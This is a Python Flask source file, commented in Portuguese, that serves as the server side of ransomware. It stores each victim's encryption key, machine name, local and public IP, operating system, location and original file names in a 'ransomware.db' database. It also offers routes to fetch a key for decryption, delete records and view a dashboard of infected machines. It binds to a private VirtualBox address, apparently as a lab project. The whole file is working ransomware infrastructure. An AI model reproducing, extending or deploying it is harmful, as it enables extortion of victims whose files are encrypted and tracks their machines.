from flask import Flask, redirect, request, jsonify, render_template
import sqlite3
import datetime
import os

# Criando a aplicação Flask
app = Flask(__name__)

# Configuração do banco de dados SQLite
def init_db():
    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keys (
                       id INTEGER PRIMARY KEY AUTOINCREMENT,
                       machine_id TEXT NOT NULL,
                       encryption_key TEXT NOT NULL,
                       machine_name TEXT NOT NULL,
                       ip_address TEXT NOT NULL,
                       public_ip TEXT NOT NULL,
                       os_info TEXT NOT NULL,
                       location TEXT NOT NULL,
                       execution_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                       )
            """)
        conn.commit()

# Rota que permite adicionar uma nova chave ao banco de dados via uma requisição POST.
# Ela espera um JSON contendo 'machine_id' e 'encryption_key' e armazena essas informações
# na tabela 'keys'
@app.route('/api/keys/add', methods=['POST'])
def add_key():
    data = request.json
    machine_id = data.get('machine_id', 'Desconhecido')
    encryption_key = data.get('encryption_key', 'Desconhecido')
    machine_name = data.get('machine_name', 'Desconhecido')
    ip_address = data.get('ip_address', 'Desconhecido')
    public_ip = data.get('public_ip', 'Desconhecido')
    os_info = data.get('os_info', 'Desconhecido')
    location = data.get('location', 'Desconhecido')
    file_names = data.get('file_names', '{}') # Recebe o arquivo JSON com os nomes dos arquivos.
    execution_time = datetime.datetime.now() # Captura em tempo real

    # Salvar o arquivo JSON no servidor
    json_dir = "json_files"
    os.makedirs(json_dir, exist_ok=True)
    json_path = os.path.join(json_dir, f"{machine_id}_file_names.json")
    with open(json_path, 'w') as json_file:
        json_file.write(file_names)

    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO keys (machine_id, encryption_key, machine_name, ip_address, public_ip, os_info, location, execution_time) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", (machine_id, encryption_key, machine_name, ip_address, public_ip, os_info, location, execution_time))
        conn.commit()

    return jsonify({"message": "Key stored successfully"}), 200

'''
A rota /api/keys/<machine_id> permite obter a chave de criptografia associada a um machine_id
via uma requisição GET. Se a chave for encontrada, ela é retornada em formato JSON. Caso contrário,
uma mensagem de "Key not found" é retornada com o status 404.
'''
@app.route('/api/keys/<machine_id>', methods=['GET'])
def get_key(machine_id):
    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT encryption_key FROM keys WHERE machine_id = ?", (machine_id,))
        row = cursor.fetchone()
    
    if row:
        # Inclui o envio do arquivo JSON com os nomes originais
        file_name = f"{machine_id}_file_names.json"
        file_path = os.path.join("json_files", file_name)
        if os.path.exists(file_path):
            with open(file_path, 'r') as json_file:
                file_names = json_file.read()
            return jsonify({"encryption_key": row[0], "file_names": file_names}), 200
        else:
            return jsonify({"encryption_key": row[0], "message": "Arquivo de nomes não encontrado"})
    else:
        return jsonify({"message": "Chave não encotrada"}), 404

# Rota para exclusão no servidor.
@app.route('/delete/<machine_id>', methods=['POST'])
def delete_key(machine_id):
    try:
        with sqlite3.connect("ransomware.db") as conn:
            cursor = conn.cursor()
            
            # Exclui o registro da tabela
            cursor.execute("DELETE FROM keys WHERE machine_id = ?", (machine_id,))
            
            # Exclui o arquivo JSON associado
            json_file_path = os.path.join("json_files", f"{machine_id}_file_names.json")
            if os.path.exists(json_file_path):
                os.remove(json_file_path)
            
            conn.commit()
        
        return redirect('/')
    except Exception as e:
        print(f"Erro ao excluir a chave: {e}")
        return "Erro ao excluir a chave", 500
    
@app.route('/')
def index():
    with sqlite3.connect("ransomware.db") as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT machine_id, machine_name, ip_address, public_ip, os_info, encryption_key, location, execution_time FROM keys")
        rows = cursor.fetchall()

    return render_template('index.html', rows=rows)

if __name__ == '__main__':
    init_db()
    app.run(host='10.0.2.15', port=5000)
